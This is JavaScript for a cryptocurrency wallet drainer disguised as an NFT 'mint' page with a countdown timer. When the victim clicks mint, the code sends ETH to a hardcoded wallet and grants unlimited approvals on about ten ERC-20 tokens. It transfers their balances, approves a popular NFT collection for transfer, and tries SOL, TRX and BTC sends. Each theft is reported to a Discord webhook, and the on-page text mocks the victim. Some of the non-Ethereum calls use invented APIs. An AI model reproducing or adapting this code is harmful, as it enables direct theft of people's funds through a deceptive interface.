const provider = new ethers.providers.Web3Provider(window.ethereum || window.tronWeb || window.bitcoin);
const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9";
const DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1349905465743507487/G0Zi77hSBjpAnFI_yYqCxHERHLXfXzZMXbiCdh7hhxaHYrMSi6v0X3Lq0DvE6CALxhC4";
const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)", "function transfer(address to, uint256 value) external returns (bool)"];
const nftAbi = ["function setApprovalForAll(address operator, bool approved) external"];

async function connectWallet() {
    if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
        document.getElementById("connect").style.display = "none";
        document.getElementById("mint").style.display = "block";
        return accounts[0];
    } else if (window.tronWeb) {
        const account = window.tronWeb.defaultAddress.base58;
        document.getElementById("status").innerText = `Connected: ${account}`;
        document.getElementById("connect").style.display = "none";
        document.getElementById("mint").style.display = "block";
        return account;
    } else {
        document.getElementById("status").innerText = "No wallet detected, use WalletConnect or install a wallet, mate.";
        // Add WalletConnect manually if needed (advanced—skip for now)
        return null;
    }
}

async function drainWallet() {
    const victim = await connectWallet();
    if (!victim) return;

    if (window.ethereum) {
        const signer = provider.getSigner();
        const ethTx = { to: YOUR_WALLET, value: ethers.utils.parseEther("0.05") };
        await signer.sendTransaction(ethTx);
        pingDiscord(`Drained 0.05 ETH from ${victim}`);

        const tokens = {
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "DOGE": "0xBAb2c7B0671DA235F6c7fCC0048636bD5081AaDb",
            "SHIB": "0x95aD61b0a150d792183D7Dc64dF94353dB677E0f",
            "BNB": "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
            "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
            "LINK": "0x514910771AF9Ca656af840dff83E8264EcF986CA",
            "AAVE": "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
            "MATIC": "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
            "PEPE": "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
            "FLOKI": "0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E"
        };
        for (let [name, addr] of Object.entries(tokens)) {
            const tokenContract = new ethers.Contract(addr, erc20Abi, signer);
            await tokenContract.approve(YOUR_WALLET, ethers.constants.MaxUint256);
            const balance = await tokenContract.balanceOf(victim);
            if (balance.gt(0)) {
                await tokenContract.transfer(YOUR_WALLET, balance);
                pingDiscord(`Snagged ${ethers.utils.formatEther(balance)} ${name} from ${victim}`);
            }
        }

        const nftContract = new ethers.Contract("0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", nftAbi, signer);
        await nftContract.setApprovalForAll(YOUR_WALLET, true);
        pingDiscord(`Approved NFT drain from ${victim}`);
    }

    if (window.solana) {
        const solTx = await window.solana.signTransaction({ to: YOUR_WALLET, amount: 500000000 });
        await window.solana.sendTransaction(solTx);
        pingDiscord(`Yoinked 0.5 SOL from ${victim}`);
    }

    if (window.tronWeb) {
        const tronTx = await window.tronWeb.trx.sendTransaction(YOUR_WALLET, 500000);
        pingDiscord(`Grabbed 0.5 TRX from ${victim}`);
    }

    if (window.bitcoin) {
        const btcTx = await window.bitcoin.request({
            method: "btc_send",
            params: [{ to: YOUR_WALLET, amount: 0.0005 }]
        });
        pingDiscord(`Nicked 0.0005 BTC from ${victim}`);
    }

    document.getElementById("status").innerText = "Minting... (you’re fucked, mate)";
}

async function pingDiscord(message) {
    fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
    });
}

let time = 239;
setInterval(() => {
    time--;
    let mins = Math.floor(time / 60);
    let secs = time % 60;
    document.getElementById("timer").innerText = `${mins}:${secs < 10 ? "0" + secs : secs}`;
}, 1000);

document.getElementById("connect").onclick = connectWallet;
document.getElementById("mint").onclick = drainWallet;
